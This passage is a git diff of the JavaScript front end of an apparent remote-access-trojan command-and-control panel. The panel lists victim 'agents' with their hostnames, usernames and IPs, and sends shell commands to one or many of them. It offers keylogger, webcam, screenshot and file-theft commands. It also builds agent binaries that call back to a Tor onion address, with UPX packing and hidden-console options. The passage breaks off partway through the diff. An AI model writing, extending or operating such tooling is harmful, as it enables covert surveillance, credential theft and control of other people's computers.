@@ -1,26 +1,18 @@
-let currentSession = null;
-let selectedAgents = new Set();
+// Global variables
+let currentAgent = null;
+let commandHistory = [];
+let historyIndex = -1;
 
+// Initialize when document loads
 document.addEventListener('DOMContentLoaded', function() {
     // Initialize tabs
-    initializeTabs();
-    
-    // Start periodic updates
-    updateTargets();
-    setInterval(updateTargets, 7000);
-    
-    // Initialize storage
-    updateStorage();
-});
-
-function initializeTabs() {
     const tabButtons = document.querySelectorAll('.tab-button');
     const tabPanes = document.querySelectorAll('.tab-pane');
     
     tabButtons.forEach(button => {
         button.addEventListener('click', () => {
-            // Get tab name from data attribute
             const tabName = button.getAttribute('data-tab');
+            console.log('Switching to tab:', tabName);
             
             // Remove active class from all buttons and panes
             tabButtons.forEach(btn => btn.classList.remove('active'));
@@ -28,1065 +20,77 @@ function initializeTabs() {
             
             // Add active class to clicked button and corresponding pane
             button.classList.add('active');
-            document.getElementById(`${tabName}-tab`).classList.add('active');
-            
-            // Refresh content if needed
-            if (tabName === 'storage') {
-                updateStorage();
-            } else if (tabName === 'agents') {
-                updateTargets();
+            const targetPane = document.getElementById(`${tabName}-tab`);
+            if (targetPane) {
+                targetPane.classList.add('active');
+                // Update content based on tab
+                switch(tabName) {
+                    case 'agents':
+                        updateAgentsList();
+                        break;
+                    case 'command':
+                        updateCommandCenter();
+                        break;
+                    case 'build':
+                        initializeBuildPanel();
+                        break;
+                    case 'storage':
+                        updateStorage();
+                        break;
+                }
             }
         });
     });
-}
 
-function updateStorage() {
-    fetch('/api/storage')
-        .then(response => response.json())
-        .then(data => {
-            const storageContent = document.querySelector('.storage-content');
-            storageContent.innerHTML = `
-                <div class="folder-section">
-                    <h3>Downloads</h3>
-                    <div id="downloads-list" class="file-list"></div>
-                    <div class="upload-section">
-                        <input type="file" id="upload-file" hidden>
-                        <button onclick="document.getElementById('upload-file').click()" class="upload-button">
-                            <span class="material-icons">upload_file</span>
-                            Upload File
-                        </button>
-                    </div>
-                </div>
-                <div class="folder-section">
-                    <h3>Screenshots</h3>
-                    <div id="screenshots-list" class="file-list"></div>
-                </div>
-                <div class="folder-section">
-                    <h3>Uploads</h3>
-                    <div id="uploads-list" class="file-list"></div>
-                </div>
-            `;
-            
-            updateFileList('downloads-list', data.downloads);
-            updateFileList('screenshots-list', data.screenshots);
-            updateFileList('uploads-list', data.uploads);
-            
-            // Add upload handler
-            document.getElementById('upload-file').addEventListener('change', handleFileUpload);
-        });
-}
+    // Start periodic updates for agents
+    updateAgentsList();
+    setInterval(updateAgentsList, 5000);
+});
 
-function updateFileList(elementId, files) {
-    const element = document.getElementById(elementId);
-    element.innerHTML = files.map(file => `
-        <div class="file-item">
-            <div class="file-info">
-                <span class="material-icons">${getFileIcon(file.name)}</span>
-                <span class="file-name">${file.name}</span>
-                <span class="file-size">${formatFileSize(file.size)}</span>
-            </div>
-            <div class="file-actions">
-                <button onclick="downloadFile('${file.path}')" title="Download">
-                    <span class="material-icons">download</span>
-                </button>
-                <button onclick="deleteFile('${file.path}')" title="Delete">
-                    <span class="material-icons">delete</span>
-                </button>
-            </div>
-        </div>
-    `).join('');
-}
-
-function downloadFile(path) {
-    window.open(`/download/${encodeURIComponent(path)}`, '_blank');
-}
-
-function deleteFile(path) {
-    if (confirm('Are you sure you want to delete this file?')) {
-        fetch('/api/delete_file', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ path })
-        })
-        .then(response => response.json())
-        .then(() => updateStorage());
-    }
-}
-
-function updateTargets() {
+// Agents Tab Functions
+function updateAgentsList() {
     fetch('/api/targets')
         .then(response => response.json())
-        .then(targets => {
+        .then(agents => {
             const targetsList = document.getElementById('targets-list');
             if (!targetsList) return;
 
-            // Clear existing content
-            targetsList.innerHTML = '';
-
-            if (targets.length === 0) {
+            if (agents.length === 0) {
                 targetsList.innerHTML = `
-                    <div class="no-targets">
+                    <div class="no-agents">
                         <span class="material-icons">devices_off</span>
                         <p>No agents connected</p>
                     </div>`;
                 return;
             }
 
-            // Sort targets by connection time (newest first)
-            targets.sort((a, b) => new Date(b.connected_time) - new Date(a.connected_time));
-
-            targets.forEach(target => {
-                const targetElement = document.createElement('div');
-                targetElement.className = 'target-item';
-                targetElement.dataset.id = target.id;
-
-                // Parse IP and port from string
-                const ipString = target.ip.toString();
-                const ipMatch = ipString.match(/([0-9.]+):(\d+)/);
-                const ip = ipMatch ? ipMatch[1] : ipString;
-                const port = ipMatch ? ipMatch[2] : '';
-
-                targetElement.innerHTML = `
-                    <div class="agent-checkbox">
-                        <input type="checkbox" id="agent-${target.id}" 
-                            ${selectedAgents.has(target.id) ? 'checked' : ''}>
+            targetsList.innerHTML = agents.map(agent => `
+                <div class="agent-item" data-id="${agent.id}">
+                    <div class="agent-header">
+                        <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
+                        <div class="agent-name">${agent.alias || `Agent_${agent.id}`}</div>
+                        <div class="agent-os">${agent.os_type || 'Unknown'}</div>
                     </div>
-                    <div class="agent-info">
-                        <div class="agent-details">
-                            <div class="agent-header">
-                                <div class="status-badge ${isAgentActive(target.last_seen) ? 'online' : 'offline'}"></div>
-                                <div class="agent-name">${target.alias || `Agent_${target.id}`}</div>
-                                <div class="os-type">${target.os_type || 'Unknown'}</div>
-                            </div>
-                            <div class="agent-meta">
-                                <span>
-                                    <span class="material-icons">router</span>
-                                    ${ip}${port ? ':' + port : ''}
-                                </span>
-                                <span>
-                                    <span class="material-icons">schedule</span>
-                                    ${getTimeAgo(new Date(target.last_seen))}
-                                </span>
-                            </div>
-                            <div class="agent-system">
-                                <span>
-                                    <span class="material-icons">computer</span>
-                                    ${target.hostname || 'Unknown'}
-                                </span>
-                                <span>
-                                    <span class="material-icons">person</span>
-                                    ${target.username || 'Unknown'}
-                                </span>
-                            </div>
-                        </div>
+                    <div class="agent-details">
+                        <span><i class="material-icons">computer</i>${agent.hostname || 'Unknown'}</span>
+                        <span><i class="material-icons">person</i>${agent.username || 'Unknown'}</span>
+                        <span><i class="material-icons">router</i>${agent.ip}</span>
                     </div>
-                `;
-
-                // Add click handler for checkbox
-                const checkbox = targetElement.querySelector(`#agent-${target.id}`);
-                checkbox.addEventListener('change', (e) => {
-                    e.stopPropagation();
-                    if (e.target.checked) {
-                        selectedAgents.add(target.id);
-                    } else {
-                        selectedAgents.delete(target.id);
-                    }
-                    updateSelectedCount();
-                });
-
-                // Add click handler for the whole target item
-                targetElement.addEventListener('click', (e) => {
-                    if (!e.target.matches('input[type="checkbox"]')) {
-                        selectSession(target.id);
-                    }
-                });
-
-                targetsList.appendChild(targetElement);
-            });
-
-            // Update selected count
-            updateSelectedCount();
-            
-            // Debug log
-            console.log('Updated targets:', targets);
-        })
-        .catch(error => {
-            console.error('Error fetching targets:', error);
-        });
-}
-
-function updateSelectedCount() {
-    const count = selectedAgents.size;
-    const countElement = document.querySelector('.selected-count');
-    if (countElement) {
-        countElement.textContent = `${count} agent${count !== 1 ? 's' : ''} selected`;
-    }
-}
-
-function sendMultiCommand() {
-    if (selectedAgents.size === 0) {
-        appendToOutput(`<div class="error-output">No agents selected</div>`);
-        return;
-    }
-    
-    const commandInput = document.getElementById('command-input');
-    const command = commandInput.value.trim();
-    if (!command) return;
-    
-    // Clear input and add command to output
-    commandInput.value = '';
-    appendToOutput(`<div class="command-entry">
-        <span class="prompt">$</span>
-        <span class="command">${escapeHtml(command)} (to ${selectedAgents.size} agents)</span>
-    </div>`);
-    
-    // Show loading state
-    setLoading(true);
-    
-    // Send command to all selected agents
-    const promises = Array.from(selectedAgents).map(agentId => 
-        fetch('/api/send_command', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                session_id: agentId,
-                command: command
-            })
-        }).then(response => response.json())
-    );
-    
-    Promise.all(promises)
-        .then(results => {
-            results.forEach((data, index) => {
-                const agentId = Array.from(selectedAgents)[index];
-                if (data.error) {
-                    appendToOutput(`<div class="error-output">Agent ${agentId}: ${escapeHtml(data.error)}</div>`);
-                } else {
-                    appendToOutput(`<div class="command-output">Agent ${agentId}:\n${formatOutput(data.output)}</div>`);
-                }
-            });
-        })
-        .catch(error => {
-            appendToOutput(`<div class="error-output">Error: ${escapeHtml(error.message)}</div>`);
-        })
-        .finally(() => {
-            setLoading(false);
-            scrollOutputToBottom();
-        });
-}
-
-function getTimeAgo(date) {
-    const seconds = Math.floor((new Date() - date) / 1000);
-    
-    let interval = seconds / 31536000;
-    if (interval > 1) return Math.floor(interval) + ' years ago';
-    
-    interval = seconds / 2592000;
-    if (interval > 1) return Math.floor(interval) + ' months ago';
-    
-    interval = seconds / 86400;
-    if (interval > 1) return Math.floor(interval) + ' days ago';
-    
-    interval = seconds / 3600;
-    if (interval > 1) return Math.floor(interval) + ' hours ago';
-    
-    interval = seconds / 60;
-    if (interval > 1) return Math.floor(interval) + ' minutes ago';
-    
-    return Math.floor(seconds) + ' seconds ago';
-}
-
-function selectSession(sessionId) {
-    currentSession = sessionId;
-    const commandPanel = document.querySelector('.command-panel');
-    const sessionInfo = document.getElementById('current-session');
-    
-    // Show command panel
-    commandPanel.classList.add('active');
-    
-    // Get target info
-    fetch('/api/targets')
-        .then(response => response.json())
-        .then(targets => {
-            const target = targets.find(t => t.id === sessionId);
-            if (!target) return;
-            
-            // Update session info
-            sessionInfo.innerHTML = `
-                <div class="session-header">
-                    <div class="session-title">
-                        <span class="material-icons">${getOSIcon(target.os_type)}</span>
-                        Session ${target.id} - ${target.alias}
-                        <div class="status-badge online"></div>
+                    <div class="agent-actions">
+                        <button onclick="commandAgent(${agent.id})" title="Command">
+                            <span class="material-icons">terminal</span>
+                        </button>
+                        <button onclick="terminateAgent(${agent.id})" title="Terminate">
+                            <span class="material-icons">power_settings_new</span>
+                        </button>
                     </div>
-                    <div class="session-details">
-                        <div>
-                            <span class="material-icons">computer</span>
-                            ${target.hostname} (${target.os_type})
-                        </div>
-                        <div>
-                            <span class="material-icons">person</span>
-                            ${target.username} ${target.is_admin ? '(Admin)' : '(User)'}
-                        </div>
-                        <div>
-                            <span class="material-icons">router</span>
-                            ${target.ip.replace(/[()]/g, '').split(',')[0]}
-                        </div>
-                    </div>
-                </div>
-                <div id="output"></div>
-                <div class="command-input">
-                    <input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
-                    <button onclick="sendCommand()" class="send-button">
-                        <span class="material-icons">send</span>
-                    </button>
-                </div>
-                <div class="command-buttons">
-                    <button onclick="showHelp()" class="help-button">
-                        <span class="material-icons">help_outline</span>
-                        Help
-                    </button>
-                    <button onclick="clearOutput()" class="clear-button">
-                        <span class="material-icons">clear_all</span>
-                        Clear
-                    </button>
-                    <button onclick="terminateSession(${target.id})" class="danger-button">
-                        <span class="material-icons">power_settings_new</span>
-                        Terminate
-                    </button>
-                </div>
-            `;
-            
-            // Focus command input
-            const commandInput = document.getElementById('command-input');
-            commandInput.focus();
-            
-            // Add command history support
-            commandInput.addEventListener('keydown', handleCommandHistory);
-            commandInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    sendCommand();
-                }
-            });
-        });
-}
-
-function deselectSession() {
-    currentSession = null;
-    const commandPanel = document.querySelector('.command-panel');
-    const sessionInfo = document.getElementById('current-session');
-    
-    commandPanel.classList.remove('active');
-    sessionInfo.innerHTML = `
-        <div class="no-session-message">
-            <span class="material-icons">terminal_off</span>
-            <div>No active session selected</div>
-            <div>Click on a session to start commanding</div>
-        </div>
-    `;
-}
-
-function setLoading(isLoading) {
-    const sendButton = document.querySelector('.send-button');
-    if (isLoading) {
-        sendButton.disabled = true;
-        sendButton.innerHTML = '<span class="material-icons loading">sync</span>';
-    } else {
-        sendButton.disabled = false;
-        sendButton.innerHTML = '<span class="material-icons">send</span>';
-    }
-}
-
-function sendCommand() {
-    if (selectedAgents.size === 0) {
-        appendToOutput(`<div class="error-output">No agents selected</div>`);
-        return;
-    }
-    
-    const commandInput = document.getElementById('command-input');
-    const command = commandInput.value.trim();
-    if (!command) return;
-    
-    // Clear input and add command to output
-    commandInput.value = '';
-    appendToOutput(`<div class="command-entry">
-        <span class="prompt">$</span>
-        <span class="command">${escapeHtml(command)} (to ${selectedAgents.size} agents)</span>
-    </div>`);
-    
-    // Show loading state
-    setLoading(true);
-    
-    // Send command to all selected agents
-    const promises = Array.from(selectedAgents).map(agentId => {
-        console.log(`Sending command "${command}" to agent ${agentId}`);
-        return fetch('/api/send_command', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                session_id: parseInt(agentId),
-                command: command
-            })
-        })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
-            }
-            return response.json();
-        })
-        .then(data => {
-            if (data.error) {
-                throw new Error(data.error);
-            }
-            return { agentId, data };
-        });
-    });
-    
-    Promise.all(promises)
-        .then(results => {
-            results.forEach(({ agentId, data }) => {
-                console.log(`Response from agent ${agentId}:`, data);
-                appendToOutput(`<div class="command-output">
-                    <div class="output-header">Agent ${agentId}:</div>
-                    ${formatOutput(data.output)}
-                </div>`);
-            });
-        })
-        .catch(error => {
-            console.error('Command execution error:', error);
-            appendToOutput(`<div class="error-output">Error: ${escapeHtml(error.message)}</div>`);
-        })
-        .finally(() => {
-            setLoading(false);
-            scrollOutputToBottom();
-        });
-}
-
-function appendToOutput(html) {
-    const output = document.getElementById('output');
-    if (output) {
-        output.innerHTML += html;
-        scrollOutputToBottom();
-    }
-}
-
-function formatOutput(output) {
-    if (typeof output !== 'string') {
-        output = JSON.stringify(output, null, 2);
-    }
-    
-    // Escape HTML
-    output = escapeHtml(output);
-    
-    // Highlight commands
-    output = output.replace(/^(\$|\>)\s+(.+)$/gm, (match, prompt, cmd) => {
-        return `<span class="prompt">${prompt}</span> <span class="command">${highlightCommand(cmd)}</span>`;
-    });
-    
-    // Highlight paths and URLs
-    output = output.replace(/(?:^|\s)(\/[\w\-./]+)/g, ' <span class="path">$1</span>');
-    output = output.replace(/(https?:\/\/[^\s]+)/g, '<span class="url">$1</span>');
-    
-    // Highlight IP addresses
-    output = output.replace(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/g, '<span class="ip">$1</span>');
-    
-    // Highlight success/error messages
-    output = output.replace(/^(Success|OK|Done):.+$/gm, '<span class="success">$&</span>');
-    output = output.replace(/^(Error|Failed|Warning):.+$/gm, '<span class="error">$&</span>');
-    
-    return output.replace(/\n/g, '<br>');
-}
-
-function escapeHtml(unsafe) {
-    return unsafe
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
-}
-
-function scrollOutputToBottom() {
-    const output = document.getElementById('output');
-    if (output) {
-        output.scrollTop = output.scrollHeight;
-    }
-}
-
-function clearOutput() {
-    const output = document.getElementById('output');
-    if (output) {
-        output.innerHTML = '';
-    }
-}
-
-// Add command history support
-let commandHistory = [];
-let historyIndex = -1;
-
-function handleCommandHistory(e) {
-    const commandInput = document.getElementById('command-input');
-    
-    if (e.key === 'ArrowUp') {
-        e.preventDefault();
-        if (historyIndex < commandHistory.length - 1) {
-            historyIndex++;
-            commandInput.value = commandHistory[historyIndex];
-        }
-    } else if (e.key === 'ArrowDown') {
-        e.preventDefault();
-        if (historyIndex > -1) {
-            historyIndex--;
-            commandInput.value = historyIndex >= 0 ? commandHistory[historyIndex] : '';
-        }
-    }
-}
-
-// Add CSS for command interface
-const commandStyle = document.createElement('style');
-commandStyle.textContent = `
-    .command-output {
-        background: var(--card-dark);
-        border-radius: 4px;
-        padding: 12px;
-        margin: 8px 0;
-        font-family: 'Roboto Mono', monospace;
-        white-space: pre-wrap;
-        word-break: break-all;
-    }
-
-    .command-entry {
-        color: var(--primary-color);
-        margin: 8px 0;
-        font-family: 'Roboto Mono', monospace;
-    }
-
-    .command-entry .prompt {
-        color: var(--success-color);
-        margin-right: 8px;
-    }
-
-    .error-output {
-        color: var(--danger-color);
-        background: rgba(244, 67, 54, 0.1);
-        border-radius: 4px;
-        padding: 12px;
-        margin: 8px 0;
-        font-family: 'Roboto Mono', monospace;
-    }
-
-    #output {
-        height: 400px;
-        overflow-y: auto;
-        padding: 12px;
-        background: var(--card-dark);
-        border-radius: 8px;
-        margin-bottom: 12px;
-    }
-
-    .loading {
-        width: 20px;
-        height: 20px;
-        border: 2px solid #f3f3f3;
-        border-top: 2px solid var(--primary-color);
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-`;
-
-document.head.appendChild(commandStyle);
-
-function uploadFile() {
-    const fileInput = document.getElementById('file-input');
-    const file = fileInput.files[0];
-    
-    if (!file) {
-        alert('Please select a file first');
-        return;
-    }
-    
-    const formData = new FormData();
-    formData.append('file', file);
-    
-    fetch('/api/upload', {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.json())
-    .then(data => {
-        const output = document.getElementById('output');
-        output.textContent += `\n> File Upload: ${data.message}\n`;
-        output.scrollTop = output.scrollHeight;
-        fileInput.value = '';
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        alert('Error uploading file');
-    });
-}
-
-function showHelp() {
-    fetch('/api/send_command', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            session_id: currentSession || 0,
-            command: 'help'
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        const output = document.getElementById('output');
-        output.innerHTML += `\n<div class="help-text">${formatHelpText(data.result)}</div>\n`;
-        output.scrollTop = output.scrollHeight;
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        alert('Error getting help');
-    });
-}
-
-function formatHelpText(text) {
-    return text.replace(/^([A-Za-z\s]+):$/gm, '<div class="command-category">$1:</div>')
-               .replace(/^\s\s([a-z_]+.*-->.*$)/gm, '<div class="command-item">$1</div>')
-               .replace(/\n/g, '<br>');
-}
-
-// Update targets list every 7 seconds
-const UPDATE_INTERVAL = 7000;
-
-function startTargetUpdates() {
-    // Initial update
-    updateTargets();
-    
-    // Set interval for updates
-    setInterval(() => {
-        updateTargets();
-        
-        // Show update indicator
-        const targetPanel = document.querySelector('.targets-panel h2');
-        targetPanel.classList.add('updating');
-        
-        // Remove indicator after animation
-        setTimeout(() => {
-            targetPanel.classList.remove('updating');
-        }, 1000);
-    }, UPDATE_INTERVAL);
-}
-
-// Start the update cycle
-startTargetUpdates();
-
-// Handle Enter key in command input
-document.getElementById('command-input').addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') {
-        sendCommand();
-    }
-});
-
-// Add new functions for session management
-function renameSession(sessionId) {
-    const newAlias = prompt('Enter new alias for session ' + sessionId);
-    if (newAlias) {
-        fetch('/api/set_alias', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                session_id: sessionId,
-                alias: newAlias
-            })
-        })
-        .then(response => response.json())
-        .then(() => {
-            updateTargets();
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('Error renaming session');
-        });
-    }
-}
-
-function terminateSession(sessionId) {
-    if (confirm('Are you sure you want to terminate this session?')) {
-        sendCommandToSession(sessionId, 'quit')
-            .then(() => {
-                if (currentSession === sessionId) {
-                    deselectSession();
-                }
-                updateTargets();
-            });
-    }
-}
-
-function sendCommandToSession(sessionId, command) {
-    return fetch('/api/send_command', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            session_id: sessionId,
-            command: command
-        })
-    })
-    .then(response => response.json());
-}
-
-// Initialize map when page loads
-document.addEventListener('DOMContentLoaded', initMap);
-
-// Add these event listeners
-document.addEventListener('DOMContentLoaded', () => {
-    initTheme();
-    document.getElementById('theme-toggle').addEventListener('change', toggleTheme);
-});
-
-// Add build agent functionality
-function buildAgent() {
-    const buildStatus = document.querySelector('.build-status');
-    const progress = buildStatus.querySelector('.progress');
-    const statusText = buildStatus.querySelector('.status-text');
-    
-    // Get selected language
-    const selectedLanguage = document.querySelector('input[name="language"]:checked').value;
-    
-    // Get selected skills
-    const selectedSkills = Array.from(document.querySelectorAll('input[name="skills"]:checked'))
-        .map(checkbox => checkbox.value);
-    
-    const buildData = {
-        language: selectedLanguage,
-        platform: document.getElementById('platform-select').value,
-        onion_address: document.getElementById('onion-address').value,
-        port: document.getElementById('port-number').value,
-        options: {
-            noconsole: document.getElementById('option-noconsole').checked,
-            upx: document.getElementById('option-upx').checked
-        },
-        skills: selectedSkills
-    };
-    
-    // Validate required fields
-    if (!buildData.onion_address) {
-        alert('Please enter an onion address');
-        return;
-    }
-    
-    if (selectedSkills.length === 0) {
-        if (!confirm('No capabilities selected. Build minimal agent?')) {
-            return;
-        }
-    }
-    
-    // Show build status
-    buildStatus.style.display = 'block';
-    buildStatus.className = 'build-status';
-    progress.style.width = '0%';
-    statusText.textContent = 'Starting build process...';
-    
-    fetch('/api/build_agent', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(buildData)
-    })
-    .then(response => {
-        if (!response.ok) throw new Error('Build failed');
-        return response.json();
-    })
-    .then(data => {
-        if (data.status === 'building') {
-            // Poll build status
-            pollBuildStatus(data.build_id);
-        } else {
-            showBuildComplete(data);
-        }
-    })
-    .catch(error => {
-        buildStatus.className = 'build-status error';
-        statusText.textContent = `Build failed: ${error.message}`;
-    });
-}
-
-function pollBuildStatus(buildId) {
-    const buildStatus = document.querySelector('.build-status');
-    const progress = buildStatus.querySelector('.progress');
-    const statusText = buildStatus.querySelector('.status-text');
-    
-    const poll = () => {
-        fetch(`/api/build_status/${buildId}`)
-            .then(response => response.json())
-            .then(data => {
-                progress.style.width = `${data.progress}%`;
-                statusText.textContent = data.status;
-                
-                if (data.state === 'building') {
-                    setTimeout(poll, 1000);
-                } else if (data.state === 'complete') {
-                    showBuildComplete(data);
-                } else if (data.state === 'error') {
-                    throw new Error(data.error);
-                }
-            })
-            .catch(error => {
-                buildStatus.className = 'build-status error';
-                statusText.textContent = `Build failed: ${error.message}`;
-            });
-    };
-    
-    poll();
-}
-
-function showBuildComplete(data) {
-    const buildStatus = document.querySelector('.build-status');
-    const progress = buildStatus.querySelector('.progress');
-    const statusText = buildStatus.querySelector('.status-text');
-    
-    buildStatus.className = 'build-status success';
-    progress.style.width = '100%';
-    statusText.innerHTML = `
-        Build complete! <br>
-        <a href="/download/${data.filename}" class="download-link">
-            <span class="material-icons">download</span>
-            Download Agent
-        </a>
-    `;
-}
-
-function getOSIcon(osType) {
-    const osLower = osType.toLowerCase();
-    if (osLower.includes('windows')) return 'computer';
-    if (osLower.includes('linux') || osLower.includes('ubuntu') || osLower.includes('kali')) return 'laptop_linux';
-    if (osLower.includes('mac') || osLower.includes('macos')) return 'laptop_mac';
-    return 'devices';
-}
-
-// Add CSS for command panel
-const style = document.createElement('style');
-style.textContent = `
-    .command-panel {
-        display: none;
-        background: var(--surface-dark);
-        border-radius: 8px;
-        padding: 20px;
-        margin-top: 20px;
-    }
-
-    .command-panel.active {
-        display: block;
-    }
-
-    .session-header {
-        margin-bottom: 20px;
-        padding-bottom: 20px;
-        border-bottom: 1px solid var(--card-dark);
-    }
-
-    .session-title {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        font-size: 18px;
-        font-weight: 500;
-        margin-bottom: 12px;
-    }
-
-    .session-details {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-        gap: 12px;
-        font-size: 14px;
-        color: var(--text-secondary);
-    }
-
-    .session-details div {
-        display: flex;
-        align-items: center;
-        gap: 8px;
-    }
-
-    .danger-button {
-        background: var(--danger-color);
-    }
-
-    .danger-button:hover {
-        background: #d32f2f;
-    }
-`;
-
-document.head.appendChild(style);
-
-// Add command suggestions and auto-completion
-const commonCommands = [
-    { cmd: 'help', desc: 'Show available commands' },
-    { cmd: 'sysinfo', desc: 'Get system information' },
-    { cmd: 'screenshot', desc: 'Take screenshot' },
-    { cmd: 'webcam', desc: 'Capture webcam image' },
-    { cmd: 'keylog_start', desc: 'Start keylogger' },
-    { cmd: 'keylog_dump', desc: 'View keylogger data' },
-    { cmd: 'keylog_stop', desc: 'Stop keylogger' },
-    { cmd: 'download', desc: 'Download file from target' },
-    { cmd: 'upload', desc: 'Upload file to target' },
-    { cmd: 'cd', desc: 'Change directory' },
-    { cmd: 'pwd', desc: 'Print working directory' },
-    { cmd: 'quit', desc: 'Terminate session' }
-];
-
-function setupCommandInput(inputElement) {
-    const suggestionsBox = document.createElement('div');
-    suggestionsBox.className = 'command-suggestions';
-    inputElement.parentNode.appendChild(suggestionsBox);
-    
-    let currentSuggestionIndex = -1;
-    
-    inputElement.addEventListener('input', (e) => {
-        const input = e.target.value.toLowerCase();
-        if (!input) {
-            suggestionsBox.style.display = 'none';
-            return;
-        }
-        
-        const suggestions = commonCommands.filter(cmd => 
-            cmd.cmd.toLowerCase().startsWith(input)
-        );
-        
-        if (suggestions.length > 0) {
-            suggestionsBox.innerHTML = suggestions.map((cmd, index) => `
-                <div class="suggestion-item ${index === currentSuggestionIndex ? 'selected' : ''}" 
-                     data-command="${cmd.cmd}">
-                    <span class="suggestion-cmd">${cmd.cmd}</span>
-                    <span class="suggestion-desc">${cmd.desc}</span>
                 </div>
             `).join('');
-            suggestionsBox.style.display = 'block';
-            
-            // Add click handlers
-            suggestionsBox.querySelectorAll('.suggestion-item').forEach(item => {
-                item.addEventListener('click', () => {
-                    inputElement.value = item.dataset.command + ' ';
-                    inputElement.focus();
-                    suggestionsBox.style.display = 'none';
-                });
-            });
-        } else {
-            suggestionsBox.style.display = 'none';
-        }
-    });
-    
-    // Handle keyboard navigation
-    inputElement.addEventListener('keydown', (e) => {
-        const suggestions = suggestionsBox.querySelectorAll('.suggestion-item');
-        if (!suggestions.length) return;
-        
-        if (e.key === 'ArrowDown') {
-            e.preventDefault();
-            currentSuggestionIndex = Math.min(currentSuggestionIndex + 1, suggestions.length - 1);
-            updateSuggestionSelection(suggestions);
-        } else if (e.key === 'ArrowUp') {
-            e.preventDefault();
-            currentSuggestionIndex = Math.max(currentSuggestionIndex - 1, 0);
-            updateSuggestionSelection(suggestions);
-        } else if (e.key === 'Tab') {
-            e.preventDefault();
-            if (currentSuggestionIndex >= 0) {
-                inputElement.value = suggestions[currentSuggestionIndex].dataset.command + ' ';
-            } else if (suggestions.length > 0) {
-                inputElement.value = suggestions[0].dataset.command + ' ';
-            }
-            suggestionsBox.style.display = 'none';
-        } else if (e.key === 'Escape') {
-            suggestionsBox.style.display = 'none';
-            currentSuggestionIndex = -1;
-        }
-    });
-    
-    // Hide suggestions when clicking outside
-    document.addEventListener('click', (e) => {
-        if (!e.target.closest('.command-input')) {
-            suggestionsBox.style.display = 'none';
-            currentSuggestionIndex = -1;
-        }
-    });
+        });
 }
 
-function updateSuggestionSelection(suggestions) {
-    suggestions.forEach((item, index) => {
-        item.classList.toggle('selected', index === currentSuggestionIndex);
-    });
-}
-
-function highlightCommand(cmd) {
-    const parts = cmd.split(' ');
-    const command = parts[0];
-    const args = parts.slice(1).join(' ');
-    
-    if (commonCommands.some(c => c.cmd === command)) {
-        return `<span class="cmd-name">${command}</span>${args ? ' ' + args : ''}`;
-    }
-    return cmd;
-}
-
-function getCurrentPrompt() {
-    return `<span class="terminal-prompt-user">user</span>` +
-           `<span class="terminal-prompt-at">@</span>` +
-           `<span class="terminal-prompt-host">c2-server</span>` +
-           `<span class="terminal-prompt-path">~/command</span>` +
-           `<span class="terminal-prompt-char">$</span>`;
-}
-
-// Add command history navigation
-let commandHistory = [];
-let historyIndex = -1;
-
-document.getElementById('command-input').addEventListener('keydown', function(e) {
-    if (e.key === 'ArrowUp') {
-        e.preventDefault();
-        if (historyIndex < commandHistory.length - 1) {
-            historyIndex++;
-            this.value = commandHistory[historyIndex];
-        }
-    } else if (e.key === 'ArrowDown') {
-        e.preventDefault();
-        if (historyIndex > -1) {
-            historyIndex--;
-            this.value = historyIndex === -1 ? '' : commandHistory[historyIndex];
-        }
-    }
-}); 
-
-// Add this helper function
-function isAgentActive(lastSeen) {
-    const lastSeenDate = new Date(lastSeen);
-    const now = new Date();
-    // Consider agent active if last seen within last 30 seconds
-    return (now - lastSeenDate) < 30000;
-}
-
-// Start periodic updates when page loads
-document.addEventListener('DOMContentLoaded', function() {
-    updateTargets();
-    // Update every 7 seconds
-    setInterval(updateTargets, 7000);
-}); 
-
-function updateAgentList() {
+// Command Center Functions
+function updateCommandCenter() {
     fetch('/api/targets')
         .then(response => response.json())
         .then(agents => {
@@ -1096,96 +100,96 @@ function updateAgentList() {
             agentList.innerHTML = agents.map(agent => `
                 <div class="agent-card ${currentAgent === agent.id ? 'active' : ''}" 
                      onclick="selectAgent(${agent.id})">
-                    <div class="agent-card-header">
-                        <div class="agent-status ${isAgentActive(agent.last_seen) ? '' : 'offline'}"></div>
+                    <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
+                    <div class="agent-info">
                         <div class="agent-name">${agent.alias || `Agent_${agent.id}`}</div>
-                    </div>
-                    <div class="agent-meta">
-                        <span class="agent-ip">${agent.ip}</span>
-                        <span class="agent-os">${agent.os_type || 'Unknown'}</span>
+                        <div class="agent-os">${agent.os_type || 'Unknown'}</div>
                     </div>
                 </div>
             `).join('');
         });
 }
 
-let currentAgent = null;
-let commandHistory = [];
-let historyIndex = -1;
+// Build Tab Functions
+function initializeBuildPanel() {
+    const buildPanel = document.querySelector('.build-panel');
+    buildPanel.innerHTML = `
+        <h2>Build Agent</h2>
